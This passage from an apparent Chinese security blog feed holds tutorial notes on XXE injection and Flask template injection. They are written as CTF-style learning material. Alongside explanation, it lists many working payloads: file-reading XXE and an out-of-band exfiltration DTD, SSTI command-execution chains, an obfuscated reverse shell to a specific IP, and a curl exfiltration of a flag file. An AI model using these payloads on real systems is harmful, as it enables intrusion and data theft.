&lt;secret&gt;login&lt;&#x2F;secret&gt;</span><br><span class="line">&lt;&#x2F;reset&gt;</span><br><span class="line">&lt;to&gt;</span><br></pre></td></tr></table></figure><p><strong>XML DTD介绍</strong></p><p>DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;</span><br><span class="line">&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>DTD实体介绍</strong></p><ul><li><p>实体定义</p><p>实体是用于定义引用普通文本或者特殊字符的快捷方式的变量</p></li></ul><p>在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p><p><strong>内部实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t01b0b455cabdadf651.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p> <strong>外部实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t01a5b9284363aff87d.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>外部参数实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/E:%5CHexo-Blog%5Csource_posts%5Cxxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%5Ct01755d18a3adf6383c.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容”&gt;</span><br></pre></td></tr></table></figure><h3 id="0x-02-XML注入产生的原理"><a href="#0x-02-XML注入产生的原理" class="headerlink" title="0x 02 XML注入产生的原理"></a>0x 02 XML注入产生的原理</h3><p>​    XXE漏洞全称XML External Entity  Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="0x-03-常见攻击方法"><a href="#0x-03-常见攻击方法" class="headerlink" title="0x 03 常见攻击方法"></a>0x 03 常见攻击方法</h3><h4 id="3-1-有回显读本地敏感文件-Normal-XXE"><a href="#3-1-有回显读本地敏感文件-Normal-XXE" class="headerlink" title="3.1 有回显读本地敏感文件(Normal XXE)"></a>3.1 有回显读本地敏感文件(Normal XXE)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>注意：</p><blockquote><p>直接读取php文件会报错，因为php文件里面有&lt;&gt;//等特殊字符，xml解析时候会当成xml语法来解析。这时候就分不清处哪个是真正的xml语句了，</p><p>直接利用file协议读取PHP文件，就会产生报错，那么需要base64编码来读取</p></blockquote><h4 id="3-2-无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#3-2-无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="3.2 无回显读取本地敏感文件(Blind OOB XXE)"></a>3.2 无回显读取本地敏感文件(Blind OOB XXE)</h4><ul><li>攻击流程：<ol><li>客户端发送payload 1给web服务器</li><li>web服务器向vps获取恶意DTD，并执行文件读取payload2</li><li>web服务器带着回显结果访问VPS上特定的FTP或者HTTP</li><li>通过VPS获得回显（nc监听端口）</li></ol></li></ul><p>我们选择使用外部DTD，在主机上编写一个dtd文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM “PHP:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd”&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all “&lt;!ENTITY send SYSTEM ‘监听的url+端口&#x2F;?file;’&gt;”&gt;</span><br><span class="line"></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t014afb0a837226463c.png" alt></p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”utf-8” ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DDOCTYPE root SYSTEM “dtd文件”&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t0177676f0a5d14e921.png" alt></p><p>我们先声明一个外部的DTD引用，然后再xml文档内容中引用外部DTD中的一般实体。</p><h4 id="3-3-HTTP-内网主机探测"><a href="#3-3-HTTP-内网主机探测" class="headerlink" title="3.3 HTTP 内网主机探测"></a>3.3 HTTP 内网主机探测</h4><p>我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;net&#x2F;fib_trie  路由树</span><br><span class="line">&#x2F;etc&#x2F;hosts  linux系统中负责ip地址与域名快速解析的文件</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp  &#x2F;&#x2F;arp表，可以获得内网其他机器的地址</span><br></pre></td></tr></table></figure><p>利用http协议继续访问内网主机或者进行内网主机端口扫描</p><p>最后放一个payload集合：<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/</a></p><p>参考资料：</p><blockquote><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><a href="https://www.anquanke.com/post/id/197423" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197423</a></p><p><a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">https://xz.aliyun.com/t/6887</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-基础知识&quot;&gt;&lt;a href=&quot;#0x-01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x 01 基础知识&quot;&gt;&lt;/a&gt;0x 01 基础知识&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;XML基础知识&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XML用于标
      
    
    </summary>
    
    
      <category term="web基础知识" scheme="http://yoursite.com/categories/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="xxe漏洞" scheme="http://yoursite.com/tags/xxe%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>flask模板注入总结</title>
    <link href="http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-05T15:34:51.000Z</published>
    <updated>2020-04-07T12:03:46.058Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><blockquote><p>参考这篇文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p></blockquote><p>漏洞原理：不正确的使用flask中的<code>render_template_string()</code>导致的<code>SSTI</code>，并且<strong>模板内容直接受用户控制</strong></p><p>注意：理论上不同机器、不同python版本的payload是不尽相同的。</p><p>测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def test():</span><br><span class="line">    code &#x3D; request.args.get(&#39;id&#39;)</span><br><span class="line">    html &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &#39;&#39;&#39;%(code)</span><br><span class="line">    return render_template_string(html)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure><p><strong>文件读取/命令执行</strong></p><p>无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类``，再寻找子类，最后找到我们需要用到的相应模块</p><p><strong>几个要用到的魔术方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><h3 id="0x-02-Python2-环境下测试"><a href="#0x-02-Python2-环境下测试" class="headerlink" title="0x 02 Python2 环境下测试"></a>0x 02 Python2 环境下测试</h3><p>测试环境：2.7.12</p><p>①获取类对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__</span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; request.__class__</span><br><span class="line">&lt;type &#39;module&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#39;list&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#39;tuple&#39;&gt;</span><br></pre></td></tr></table></figure><p>②寻找基类<code>object</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; requests.__class__.__mro__</span><br><span class="line">(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line">&gt;&gt;&gt; ().__class__.__mro__</span><br><span class="line">(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;request.__class__.__mro__[8]</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>object在最底层故在列表中的最后，通过<code>__mro__[-1]</code>可以获取到</p></blockquote><p>③寻找可用的引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()</span><br><span class="line">[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, 等等</span><br></pre></td></tr></table></figure><p>④尝试文件读取</p><p><strong>payload</strong></p><p>发现40的地方存在 <code>&lt;type &#39;file&#39;&gt;</code>，使用file方法可以读取文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">requests.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405233521992.png" alt></p><p><strong>Payload 2 利用&lt;class ‘warnings.catch_warnings’&gt;</strong></p><p>’catch_warnings’可以进一步构造来执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()   </span><br><span class="line"></span><br><span class="line"># 引用__builtins__和file模块</span><br></pre></td></tr></table></figure><p>⑤命令执行</p><p>寻找包含<code>os</code>模块的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">num &#x3D; 0</span><br><span class="line">for item in &#39;&#39;.__class__.__mro__[-1].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;os&#39; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">76 &lt;class &#39;site.Quitter&#39;&gt;</span><br></pre></td></tr></table></figure><p>前面已经找到了包含<code>os</code>模块的类，先初始化，再引用即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20200405235926575.png" alt></p><p>这里命令执行没有回显，用popen函数带出结果或者通过反弹shell和利用<code>curl</code>带出</p><p>改造后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>反弹shell方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;)</span><br></pre></td></tr></table></figure><p>curl带出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;x.x.x.x&#x2F;?data&#x3D;$data;&#39;)</span><br></pre></td></tr></table></figure><ul><li>扩展使用</li></ul><p>已知函数名可获取函数信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def fun(x&#x3D;1):</span><br><span class="line">    # nothing here</span><br><span class="line">    a&#x3D;x*2</span><br><span class="line">    flag&#x3D;&#39;neko&#39;</span><br><span class="line">    return a</span><br><span class="line">print fun.func_code.co_consts</span><br><span class="line">print fun.func_globals</span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line">(None, 2, &#39;neko&#39;)</span><br><span class="line">&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125;</span><br></pre></td></tr></table></figure><p>可构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 无回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) </span><br><span class="line"></span><br><span class="line"># 带回显</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>一般payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-03-Python3-环境测试"><a href="#0x-03-Python3-环境测试" class="headerlink" title="0x 03 Python3 环境测试"></a>0x 03 Python3 环境测试</h3><p>类似于Python2的,常用payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].popen(&quot;ls&quot;).read()</span><br><span class="line"># &lt;class &#39;os._wrap_close&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br><span class="line"># &lt;class &#39;rlcompleter.Completer&#39;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)</span><br><span class="line"></span><br><span class="line">[].__class__.__mro__[-1].__subclasses__()[155].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat</span><br><span class="line">&#x2F;flag&#39;).read()&quot;)</span><br></pre></td></tr></table></figure><p>就是<code>__global__</code>中存在<code>sys</code>或者<code>system</code>或者<code>__builtins__</code>模块,fuzz脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">for item in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;system&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;system&#39;,num,item)</span><br><span class="line">         if &#39;sys&#39; in item.__init__.__globals__:</span><br><span class="line">             print(&#39;sys&#39;,num,item)</span><br><span class="line">         if &#39;__builtins__&#39; in item.__init__.__globals__:</span><br><span class="line">          print(&#39;__builtins__&#39;,num,item)</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    